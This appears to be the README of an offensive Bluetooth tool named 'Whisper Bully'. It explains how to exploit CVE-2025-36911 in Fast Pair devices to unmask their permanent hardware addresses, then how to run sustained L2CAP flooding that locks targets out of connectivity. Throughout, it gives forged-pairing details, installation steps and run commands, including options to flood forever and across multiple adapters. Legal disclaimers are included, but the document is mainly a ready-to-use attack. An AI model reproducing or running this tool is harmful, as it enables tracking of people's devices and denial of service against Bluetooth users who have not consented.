# Whisper Bully

Bluetooth Deauthentication & Denial-of-Service Tool


https://github.com/user-attachments/assets/7e78383e-8936-47f8-94c5-68844b264499


Two-stage attack on Fast Pair devices via CVE-2025-36911:
1. **Stage 1 (Extraction)**: Extract permanent hidden BD ADDR from privacy-randomized addresses
2. **Stage 2 (Flood)**: Execute sustained L2CAP denial-of-service using EMP mode reconnect cycling

Extracts the real Bluetooth address from devices during pairing by monitoring `bluetoothctl` output for address change messages. Once extracted, optionally floods the target with synchronized L2CAP bursts to lock it out of connectivity.

## How It Works

### Stage 1: Extraction (CVE-2025-36911)

Most Bluetooth devices are paired and set to non-discoverable, since general discovery scans are what most people/OSes turn off after initial setup,this is what the exploit does to reveal the hidden full BD_ADDR:
The Whisper Pair exploit (CVE-2025-36911) works by first connecting to the target device via BLE and writing a forged Fast Pair pairing request (0x00 + random 64‑byte public key + nonce) to the key‑based pairing characteristic (UUID 1236). It then writes a fake 16‑byte Account Key to the account key characteristic (UUID 1238), tricking the device into completing the bonding process. Simultaneously, the tool triggers bluetoothctl pair and monitors its output for the [CHG] Device message, which reveals the permanent BD_ADDR when the device switches from its temporary random MAC. This exposes the factory‑programmed address, enabling reliable re‑connection and subsequent denial‑of‑service attacks.
- **Steps:**
1. Scans for devices advertising Fast Pair service (UUID `fe2c`)
2. Establishes BLE connection to target
3. Triggers pairing, monitors for `[CHG] Device` address change
4. Captures permanent BD ADDR that appears during pairing
5. Falls back to device list comparison if direct capture fails

### Stage 2: Flooding (l2flood EMP Mode)

Once permanent address is known, optionally execute sustained denial-of-service:

1. Connects to target using permanent address
2. Sends 50 L2CAP echo packets per connection (burst)
3. Closes connection intentionally
4. Resynchronizes with other threads (5ms pause)
5. Reconnects and repeats (sustained cycling)
6. Target device locked out until attack stops

## Requirements

- Linux (tested on Ubuntu 20.04+)
- Root privileges (required for `bluetoothctl` and Bleak)
- `bluetoothctl` installed and functional
- Python 3.7+
- For Stage 2 (flooding): `l2flood` with OpenMP support (included)

## ⚠️ LEGAL NOTICE

**This is a deauthentication/denial-of-service attack tool.**

Using this tool on devices you don't own or without explicit written authorization is a **FEDERAL CRIME** punishable by imprisonment and fines.

You may **ONLY** use this tool on:
- Devices you own
- Devices with explicit written permission from the owner to test

## Installation

### Prerequisites
- Python 3.7 or later
- `bluetoothctl` (from BlueZ)
- Development headers for D-Bus and GLib

### Install system dependencies for your distro

**Ubuntu / Debian:**
```bash
sudo apt update
sudo apt install -y python3 python3-pip libdbus-1-dev libglib2.0-dev bluez
```

**Fedora / RHEL / CentOS:**
```bash
sudo dnf install -y python3 python3-pip dbus-devel glib2-devel bluez
```

**Arch Linux:**
```bash
sudo pacman -S python python-pip dbus glib bluez
```

**Alpine Linux:**
```bash
apk add --no-cache python3 py3-pip dbus-dev glib-dev bluez bluez-openrc
```

**openSUSE:**
```bash
sudo zypper install -y python3 python3-pip dbus-1-devel glib2-devel bluez
```

**Void Linux:**
```bash
sudo xbps-install -S python3 python3-pip dbus-devel glib-devel bluez
```

**Generic / Other distros:**
Install equivalents of: Python 3.7+, D-Bus dev headers, GLib dev headers, BlueZ

### Clone and Install

```bash
git clone https://github.com/Ymsniper/Whisper_Bully.git
cd Whisper_Bully
pip3 install -r requirements.txt
# optional for running DOS attack:
make
sudo make install
```

## Usage

### Stage 1: Extraction

Extract permanent addresses from Fast Pair devices:

```bash
# Auto-detect and extract
sudo python3 wb.py

# Scan for 20 seconds, save to file
sudo python3 wb.py -s 20 -o targets.json

# Custom duration and output
sudo python3 wb.py -s 30 -o extracted.json
```

**NOTE:** During the pairing step, a pop-up window will appear on your device asking for PIN verification. Always select "pin correct" or accept/confirm the pairing request to allow the extraction to proceed.

### Stage 2: Flooding (Optional)

After extraction, flood the extracted addresses. Two methods:

#### Method 1: Automatic (Integrated)
```bash
sudo python3 wb.py -o targets.json
# At completion, tool asks: "Run aggressive L2CAP test... (yes/no)"
# Answer 'yes' to automatically flood extracted addresses
# Optionally choose 'f' for forever or a number of seconds
```

#### Method 2: Manual (Standalone)
```bash
# Flood targets for 120 seconds
sudo python3 aggressive_test.py -f targets.json -d 120 -t 4

# Flood targets forever (until Ctrl+C)
sudo python3 aggressive_test.py -f targets.json -f

# Flood single known address for 60 seconds
sudo python3 aggressive_test.py AA:BB:CC:DD:EE:FF -d 60

# Flood single address forever
sudo python3 aggressive_test.py AA:BB:CC:DD:EE:FF -f
```

## Output Format

Extracted addresses saved as JSON (per target):

```json
{
  "device_name": "Device Name",
  "temporary_address": "AA:BB:CC:DD:EE:FF",
  "permanent_address": "11:22:33:44:55:66",
  "rssi": -45
}
```

The `permanent_address` is the real BD ADDR. Use this for Stage 2 flooding.

## Known Limitations

### Stage 1 (Extraction)
- Only works on Linux with `bluetoothctl`
- Some devices may not advertise Fast Pair service
- Advertised MAC address could change during the connection step (address rolling - timing issue)
- If you're testing on a device that has already been connected/paired via this tool or manually, you need to forget (remove) it first so the script can work properly.

### Stage 2 (Flooding)
- Requires knowing permanent address (get from Stage 1 or other means)
- Target must be within Bluetooth range and powered on
- Device recovers after attack stops (no permanent damage)

## Stage 2: Aggressive L2CAP Flooding (Optional)

Once you have the permanent BD ADDR from Stage 1, optionally execute denial-of-service using l2flood EMP mode (`-R` flag). This performs sustained L2CAP flooding that locks the target device out of Bluetooth connectivity.

### Method 1: Integrated Workflow

Simplest approach - extraction automatically offers to flood:

```bash
sudo python3 wb.py -s 20 -o targets.json

# ... extraction completes ...
# AGGRESSIVE L2CAP TESTING (OPTIONAL)
# Run aggressive L2CAP test on extracted addresses now? (yes/no): yes
#
# Flood duration in seconds (default 60): 120
# Number of threads (default: CPU count): 4
```

Automatically floods all extracted permanent addresses.

### Method 2: Manual Reuse

Use `aggressive_test.py` to flood targets without re-extracting:

```bash
# Reuse targets from previous extraction
sudo python3 aggressive_test.py -f targets.json -d 120 -t 4

# Flood single address
sudo python3 aggressive_test.py 11:22:33:44:55:66 -d 60
```
### Multiple adapters (improoving the flood):
```bash
# Run on hci0 and hci1 simultaneously for double pressure
sudo python3 aggressive_test.py -i hci0 -d 120 ADDR &
sudo python3 aggressive_test.py -i hci1 -d 120 ADDR
# or run sudo l2flood -R with the flags you need (-h for help) 
```

### EMP Mode Details

The `-R` flag (EMP mode) implements burst-reconnect cycling:

1. **Connect Phase**: Establish L2CAP connection to target
2. **Burst Phase**: Send 50 echo packets per connection
3. **Close Phase**: Intentionally close connection
4. **Resync Phase**: All threads sleep 5ms to synchronize
5. **Loop**: Repeat continuously (sustained pressure)

**Result**: Device locked out until attack stops or device resets.

### Duration Options

Run for a specific time or forever:

```bash
# Run for 60 seconds (default)
sudo python3 aggressive_test.py 11:22:33:44:55:66

# Run for 120 seconds
sudo python3 aggressive_test.py 11:22:33:44:55:66 -d 120

# Run forever until Ctrl+C
sudo python3 aggressive_test.py 11:22:33:44:55:66 -f

# Forever with custom threads
sudo python3 aggressive_test.py -f -t 8 11:22:33:44:55:66
```

### Options

| Option | Description |
|--------|-------------|
| `-d <seconds>` | Flood duration in seconds (default: 60) |
| `-f, --forever` | Run forever until Ctrl+C (ignore `-d`) |
| `-t <threads>` | Parallel threads (default: CPU count) |
| `-s <bytes>` | L2CAP payload size (default: 600) |
| `-i <hci>` | HCI adapter to use (e.g., `hci0`) |

## Troubleshooting

### No devices found
- Check `bluetoothctl` is working: `sudo bluetoothctl list`
- Increase scan duration: `-s 30`

### BLE connection failed, Failed to extract
- If you're testing on a device that has already been connected/paired via this tool or manually, you need to forget (remove) it first so the script can work properly.

### Extraction fails with fallback
- Timing issue: pairing completed before address capture
- Device may not support Fast Pair service advertisement
- Try again: timing is sometimes unpredictable

### Permission denied
- Run with `sudo`
- Ensure your user can access `/dev/bluetooth` (may need to be in `bluetooth` group)

### Bleak import error
- Verify system dependencies are installed (see Installation section)
- Debian/Ubuntu: `sudo apt install libdbus-1-dev libglib2.0-dev`
- Fedora: `sudo dnf install dbus-devel glib2-devel`
- Arch: `sudo pacman -S dbus glib`
- Alpine: `apk add dbus-dev glib-dev`

### bluetoothctl not found
- Ubuntu/Debian: `sudo apt install bluez`
- Fedora/RHEL: `sudo dnf install bluez`
- Arch: `sudo pacman -S bluez`
- Alpine: `apk add bluez bluez-openrc`
- openSUSE: `sudo zypper install bluez`
- Void: `sudo xbps-install bluez`

### D-Bus connection errors
- Ensure D-Bus daemon is running: `sudo systemctl start dbus`
- Make D-Bus start on boot: `sudo systemctl enable dbus`
- Check Bluetooth service: `sudo systemctl status bluetooth`

### Python version conflict
- Ensure you're using Python 3.7+: `python3 --version`
- Some systems may require explicit `python3` instead of `python`
- Consider using `python3 -m pip` instead of `pip3`

## License

MIT. See LICENSE for details.

## Author

[@Ymsniper](https://github.com/Ymsniper)

## CREDITS

[@kovmir](https://github.com/kovmir) for [@l2flood](https://github.com/kovmir/l2flood)

## Disclaimer

This tool is for authorized security testing and defensive research only. Unauthorized access to Bluetooth devices is illegal. Only use on devices you own or have explicit permission to test.
